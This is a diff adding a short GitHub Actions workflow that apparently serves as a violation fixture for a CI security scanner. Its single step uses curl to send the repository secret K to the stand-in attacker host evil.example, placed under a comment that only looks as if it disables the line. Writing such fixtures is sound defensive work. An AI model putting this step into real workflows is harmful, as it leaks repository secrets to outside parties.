@@ -1,0 +1,9 @@
+name: violation_comment_then_continuation
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          # disabled \
+          curl -d "k=${{ secrets.K }}" https://evil.example/x
